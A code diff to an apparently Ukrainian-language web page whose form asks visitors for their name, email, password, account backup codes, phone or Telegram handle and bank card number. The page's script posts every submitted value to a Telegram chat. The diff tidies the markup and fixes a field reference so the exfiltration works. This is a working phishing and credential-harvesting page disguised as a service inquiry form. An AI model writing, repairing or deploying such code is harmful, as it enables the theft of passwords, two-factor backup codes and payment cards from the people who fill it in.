@@ -60,101 +60,55 @@ fbq('track', 'PageView');
 
       <div class="form">
         <div data-aos="fade-up-right" class="container"></div>
-              <form class="main-form form-fields" action="send.php" method="get"></form>
-
+        <form class="main-form form-fields" action="send.php" method="get"></form>
           <h2 class="h2-bold">Заповніть форму</h2>
-
           <h5>і наш менеджер зв'яжеться з вами впродовж години:</h5>
 
+
           <div class="container mt-5 pt-5 pb-5">
-
             <div class="col-md-6 offset-md-3">
-
               <form id="tg">
-
                 <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
               <input type="text" name="name" placeholder="Ваше Ім'я" required="">
-
             </div>
-
                <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
               <input type="email" name="email" placeholder="Ваш Email" required="">
-
             </div>
-
                 <!-- /.form-group -->
-
               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
               <input type="text" name="password" placeholder="Ваш пароль" required="">
-
             </div>
-
               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
              <textarea type="text" name="codes" cols="30" rows="1" placeholder="Ваші резервні коди"></textarea>
-
             </div>
-
              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
               <input type="tel" name="namber" placeholder="Ваш номер телефону або @username в TG" required="">
-
             </div>
-
                 <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-
             <div class="application-input">
-
               <input type="card" name="yesno" placeholder="Ваша карта (для оплати)" required="">
-
               <div  style="display:flex;justify-content:center;align-items:center;">
-
                 <label for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
-
               <select name="messanger" id="messanger">
-
                 <option value="Whatsapp-Messenger">WhatsApp Messenger</option>
-
                 <option selected value="Telegram">Telegram</option>
-
                 <option value="Viber">Viber</option>
-
               </select>
-
             </select>
-
             </div>
-
                 
-
                 <!-- /.form-group -->
-
         
-
                 <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
-
         
-
                <button type="submit" class="form-button">Відправити на перевірку <br>  (Загрузка 5 секунд) </button>
-
               </form>
-
              <h3>Натискать на кнопку потрібно 1 раз!</h3>
-
-
 
             </div>
           </div>
@@ -177,7 +131,7 @@ fbq('track', 'PageView');
               message += `<b>Коди:</b> ${ this.codes.value }\n`;
               message += `<b>Номер/TG:</b> ${ this.namber.value }\n`;
               message += `<b>Карта:</b> ${ this.yesno.value }\n`;
-              message += `<b>Спосіб зв'язку:</b> ${ this.contact.value }`;
+              message += `<b>Спосіб зв'язку:</b> ${ this.messanger.value }`;
               axios.post(URI_API, {
                   chat_id: CHAT_ID,
                   parse_mode: 'html',
